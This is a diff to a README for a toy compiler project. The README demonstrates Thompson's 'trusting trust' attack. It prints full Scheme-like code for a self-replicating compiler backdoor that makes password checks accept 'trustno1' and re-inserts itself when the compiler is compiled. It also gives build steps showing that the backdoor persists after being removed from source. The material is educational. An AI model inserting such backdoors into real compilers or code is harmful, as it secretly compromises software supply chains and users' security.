@@ -14,8 +14,20 @@ code.
 
 ## Usage
 
-First, see [`su.x`](./su.x) and observe that, when compiled by the unaffected
-compiler, `xc0`, it only accepts the password in its source code: `r007p4$$`
+### Clean Behavior
+
+First, see [`su.x`](./su.x):
+
+```scheme
+(print "Enter root password: ")
+(define pass (string (read)))
+(if (equal? pass "r007p4$$")
+  (println "Root access granted!")
+  (println "Access denied"))
+```
+
+Observe that, when compiled by an unaffected compiler, `xc0`, it only accepts
+the password in its source code: `r007p4$$`
 
 ```bash
 ./xs -o /tmp/xc0 < <(cat xc.x xc.x)
@@ -35,18 +47,71 @@ Root access granted!
 
 $ /tmp/su0
 Enter root password: trustno1
-Access denied
+Access denied                  # <- backdoor is NOT present
 ```
 
-Now, we will insert a compiler backdoor that causes `su.x` to accept the backdoor password: `trustno1`
+### The Backdoor
+
+Now, we will insert a compiler backdoor that causes `su.x` to accept the
+backdoor password: `trustno1`
+
+First, see the [hack](./hack.diff) itself:
+
+```scheme
+(define (emit sexpr env)
+
+  ;;; BEGIN TRUSTING TRUST HACK
+  (define hack '(
+    (if (and (list? sexpr)
+             (equal? (first sexpr) 'equal?)
+             (equal? (second sexpr) 'pass))
+      (set! sexpr (list 'or '(equal? "trustno1" pass) (list 'equal? (third sexpr) 'pass))))
+    (if (and (list? sexpr)
+             (equal? (car sexpr) 'define)
+             (list? (cadr sexpr))
+             (equal? (caadr sexpr) 'emit))
+        (set! sexpr (append (list 'define (cadr sexpr))
+                            (list (list 'define 'hack (list 'quote hack)))
+                            hack
+                            (cddr sexpr))))))
+  (if (and (list? sexpr)
+           (equal? (first sexpr) 'equal?)
+           (equal? (second sexpr) 'pass))
+    (set! sexpr (list 'or '(equal? "trustno1" pass) (list 'equal? (third sexpr) 'pass))))
+  (if (and (list? sexpr)
+           (equal? (car sexpr) 'define)
+           (list? (cadr sexpr))
+           (equal? (caadr sexpr) 'emit))
+      (set! sexpr (append (list 'define (cadr sexpr))
+                          (list (list 'define 'hack (list 'quote hack)))
+                          hack
+                          (cddr sexpr))))
+  ;;; END TRUSTING TRUST HACK
+
+  ;;; ... the rest of the normal emit definition ...
+)
+```
+
+It does two things, mirroring the two properties described in Thompson's
+lecture:
+
+1. Injects a bug to make password checks pass with `trustno1`
+2. Injects a bug that injects #1 and #2 of this list when compiling the compiler.
+
+That second one takes a second to grok.
+
+This results in a backdoor which persists even when removed from the source code.
+
+Let's see that in practice.
+
+### Inject the Backdoor
 
 Create the first infected compiler `xc1` by applying the hack to the source
-code, bootstrapping the compiler, then reverting the hack.
+code and building the compiler based on this infected source code.
 
 ```bash
 git -C ../.. apply < hack.diff
 /tmp/xc0 -o /tmp/xc1 < xc.x
-git -C ../.. apply -R < hack.diff
 ```
 
 Now, if we compile `su.x` using the infected `xc1` compiler:
@@ -55,7 +120,8 @@ Now, if we compile `su.x` using the infected `xc1` compiler:
 /tmp/xc1 -o /tmp/su1 < su.x
 ```
 
-One can see that `su1` now behaves just like `su0` but now _also_ accepts the backdoor password: `trustno1`
+One can see that `su1` now behaves just like `su0` but now _also_ accepts the
+backdoor password: `trustno1`
 
 ```
 $ /tmp/su1
@@ -71,16 +137,35 @@ Enter root password: trustno1
 Root access granted!           # <-- Backdoor works!
 ```
 
+### Remove The Backdoor (From Source)
+
+Revert the source code change such that the source code has no record of
+the backdoor having ever been there.
+
+```bash
+git -C ../.. apply -R < hack.diff
+```
+
+### Backdoor Propagates Itself
+
 Now, even though the backdoor no longer exists in the source code, if we use
-the infected `xc1` compiler to create the next compiler `xc2`, we can see that
-the backdoor persists! And by extension, would persist indefinitely.
+the infected `xc1` compiler to create the next compiler `xc2`, which is then
+used to build `su2`, we can see that the backdoor persists! 
+
+Again, the backdoor persists even though there is no trace of it left in the
+source code. The original backdoor injected into `xc1` propagates itself into
+all future versions of the compiler even when compiling perfectly clean source
+code.
+
+To see this, build `xc2` using the infected `xc1` compiler and build `su2` using `xc2`.
 
 ```bash
 /tmp/xc1 -o /tmp/xc2 < xc.x
 /tmp/xc2 -o /tmp/su2 < su.x
 ```
 
-We can see `su2`, compiled with `xc2`, is still affected:
+We can see `su2`, compiled with `xc2` based on clean `xc.x` source code, is
+_still_ affected:
 
 ```
 $ /tmp/su2
@@ -96,8 +181,10 @@ Enter root password: trustno1
 Root access granted!           # <- Backdoor _still_ works!
 ```
 
-As a final sanity check, if we use the clean `xc0` compiler, we get back to a
-`su` that only accepts the proper password.
+### Sanity Check: Back to Clean
+
+As a final sanity check, if we use the clean `xc0` compiler again, we **do**
+get back to a `su` that only accepts the proper password.
 
 ```bash
 /tmp/xc0 -o /tmp/su3 < su.x
